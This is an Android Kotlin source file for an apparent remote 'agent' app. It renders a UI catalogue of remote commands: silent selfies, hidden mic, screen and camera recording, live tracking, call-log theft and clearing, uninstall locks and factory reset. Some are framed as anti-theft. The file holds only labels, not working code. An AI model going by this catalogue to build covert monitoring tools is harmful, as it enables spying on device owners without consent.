package com.sentrix.agent.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.android.material.chip.Chip
import com.google.android.material.chip.ChipGroup
import com.sentrix.agent.R
import com.sentrix.agent.util.Prefs

class CommandsActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_commands)
        supportActionBar?.apply { title = "Available Commands"; setDisplayHomeAsUpEnabled(true) }
        val rv = findViewById<RecyclerView>(R.id.rvCategories)
        rv.layoutManager = LinearLayoutManager(this)
        rv.adapter = CategoryAdapter(CommandData.categories, Prefs.isRooted)
    }
    override fun onSupportNavigateUp(): Boolean { finish(); return true }
}

data class CommandItem(val name: String, val action: String, val requiresRoot: Boolean = false)
data class Category(val name: String, val emoji: String, val commands: List<CommandItem>)

object CommandData {
    val categories = listOf(
        Category("Surveillance", "📷", listOf(
            CommandItem("Take Screenshot",          "screenshot",          requiresRoot = true),
            CommandItem("Front Camera Photo",       "front_cam"),
            CommandItem("Rear Camera Photo",        "rear_cam"),
            CommandItem("Start Mic Recording",      "mic_start"),
            CommandItem("Stop Mic Recording",       "mic_stop"),
            CommandItem("Start Screen Recording",   "screen_record_start"),
            CommandItem("Stop Screen Recording",    "screen_record_stop"),
            CommandItem("Start Front Video",        "front_video_start"),
            CommandItem("Start Rear Video",         "rear_video_start"),
            CommandItem("Stop Video",               "video_stop"),
            CommandItem("Silent Selfie",            "selfie_silent"),
        )),
        Category("Location & Tracking", "📍", listOf(
            CommandItem("Get Current Location",     "location_get"),
            CommandItem("Start Live Tracking",      "location_track_start"),
            CommandItem("Stop Live Tracking",       "location_track_stop"),
        )),
        Category("Connectivity", "📶", listOf(
            CommandItem("WiFi On",                  "wifi_on",             requiresRoot = true),
            CommandItem("WiFi Off",                 "wifi_off",            requiresRoot = true),
            CommandItem("Mobile Data On",           "data_on",             requiresRoot = true),
            CommandItem("Mobile Data Off",          "data_off",            requiresRoot = true),
            CommandItem("Bluetooth On",             "bt_on",               requiresRoot = true),
            CommandItem("Bluetooth Off",            "bt_off",              requiresRoot = true),
            CommandItem("Hotspot On",               "hotspot_on",          requiresRoot = true),
            CommandItem("Hotspot Off",              "hotspot_off",         requiresRoot = true),
            CommandItem("Airplane Mode On",         "airplane_on",         requiresRoot = true),
            CommandItem("Airplane Mode Off",        "airplane_off",        requiresRoot = true),
        )),
        Category("Device Security", "🔐", listOf(
            CommandItem("Lock Screen",              "lock_screen"),
            CommandItem("Turn Screen Off",          "screen_off",          requiresRoot = true),
            CommandItem("Turn Screen On",           "screen_on",           requiresRoot = true),
            CommandItem("Block Screen Touch",       "touch_block",         requiresRoot = true),
            CommandItem("Unblock Screen Touch",     "touch_unblock",       requiresRoot = true),
            CommandItem("Disable Power Menu",       "power_menu_off",      requiresRoot = true),
            CommandItem("Enable Power Menu",        "power_menu_on",       requiresRoot = true),
            CommandItem("Encryption Check",         "encryption_check"),
            CommandItem("Send Alert SMS",           "alert_sms"),
            CommandItem("Display Lock Message",     "lock_message"),
            CommandItem("Set Lockscreen Message",   "lockscreen_msg"),
            CommandItem("Reboot Device",            "reboot",              requiresRoot = true),
            CommandItem("Factory Reset ⚠️",         "factory_reset",       requiresRoot = true),
        )),
        Category("Anti-Theft", "🚨", listOf(
            CommandItem("Enable Anti-Theft Mode",   "theft_mode_on"),
            CommandItem("Disable Anti-Theft Mode",  "theft_mode_off"),
            CommandItem("Trigger Alarm",            "alarm_start"),
            CommandItem("Stop Alarm",               "alarm_stop"),
            CommandItem("SIM Change Alert On",      "sim_alert_on"),
            CommandItem("SIM Change Alert Off",     "sim_alert_off"),
            CommandItem("Enable Intruder Detection","intruder_on"),
            CommandItem("Disable Intruder Detection","intruder_off"),
            CommandItem("Capture Intruder Photo",   "intruder_photo"),
            CommandItem("Enable Wrong PIN Photo",   "wrong_pin_photo_on"),
            CommandItem("Disable Wrong PIN Photo",  "wrong_pin_photo_off"),
            CommandItem("Trigger Safe Mode",        "safe_mode",           requiresRoot = true),
        )),
        Category("App Management", "📦", listOf(
            CommandItem("List Installed Apps",      "apps_list"),
            CommandItem("Check App Status",         "app_status"),
            CommandItem("Running Apps",             "apps_running"),
            CommandItem("Close All Background Apps","apps_close_all",      requiresRoot = true),
            CommandItem("Kill Specific App",        "app_kill",            requiresRoot = true),
            CommandItem("Disable App",              "app_disable",         requiresRoot = true),
            CommandItem("Enable App",               "app_enable",          requiresRoot = true),
            CommandItem("Prevent App Uninstall",    "uninstall_lock",      requiresRoot = true),
            CommandItem("Allow App Uninstall",      "uninstall_unlock",    requiresRoot = true),
            CommandItem("Clear App Cache",          "app_cache_clear",     requiresRoot = true),
        )),
        Category("Audio & Alerts", "🔊", listOf(
            CommandItem("Max Ring Volume",          "vol_ring_max"),
            CommandItem("Mute Ringer",              "vol_ring_mute"),
            CommandItem("Max Media Volume",         "vol_media_max"),
            CommandItem("Mute Media",               "vol_media_mute"),
            CommandItem("Play Loud Siren",          "siren_start"),
            CommandItem("Stop Siren",               "siren_stop"),
            CommandItem("Vibrate Device",           "vibrate"),
        )),
        Category("Diagnostics", "📋", listOf(
            CommandItem("Get Device Info",          "device_info"),
            CommandItem("Get Battery Level",        "battery_get"),
            CommandItem("Get Storage Info",         "storage_get"),
            CommandItem("Get Network Info",         "network_info"),
            CommandItem("Get SIM Info",             "sim_info"),
            CommandItem("Get Call Logs",            "call_logs_get"),
            CommandItem("Clear Call Logs",          "call_logs_clear"),
            CommandItem("Check Root Status",        "root_check"),
            CommandItem("Get IMEI",                 "imei_get"),
            CommandItem("Send Notification",        "notify_send"),
            CommandItem("Ping Device",              "ping"),
        )),
        Category("System", "⚙️", listOf(
            CommandItem("Flashlight On",            "torch_on"),
            CommandItem("Flashlight Off",           "torch_off"),
            CommandItem("Go to Home Screen",        "home",                requiresRoot = true),
            CommandItem("Press Back",               "back",                requiresRoot = true),
            CommandItem("Collapse Status Bar",      "statusbar_collapse",  requiresRoot = true),
        )),
    )
}

class CategoryAdapter(
    private val cats: List<Category>,
    private val rooted: Boolean
) : RecyclerView.Adapter<CategoryAdapter.VH>() {

    inner class VH(v: View) : RecyclerView.ViewHolder(v) {
        val title: TextView    = v.findViewById(R.id.tvCategoryTitle)
        val chips: ChipGroup   = v.findViewById(R.id.chipContainer)
    }

    override fun onCreateViewHolder(p: ViewGroup, t: Int) =
        VH(LayoutInflater.from(p.context).inflate(R.layout.item_category, p, false))

    override fun getItemCount() = cats.size

    override fun onBindViewHolder(h: VH, pos: Int) {
        val cat = cats[pos]
        h.title.text = "${cat.emoji}  ${cat.name}  (${cat.commands.size})"
        h.chips.removeAllViews()
        cat.commands.forEach { cmd ->
            Chip(h.itemView.context).apply {
                text       = cmd.name
                isClickable = false
                isCheckable = false
                if (cmd.requiresRoot && !rooted) {
                    alpha = 0.4f
                    setChipBackgroundColorResource(R.color.surface3)
                    setTextColor(context.getColor(R.color.text_secondary))
                    chipIcon = context.getDrawable(android.R.drawable.ic_lock_lock)
                    isChipIconVisible = true
                    chipIconSize = 14f
                } else {
                    alpha = 1f
                    setChipBackgroundColorResource(R.color.accent_dim)
                    setTextColor(context.getColor(R.color.text_primary))
                }
                h.chips.addView(this)
            }
        }
    }
}
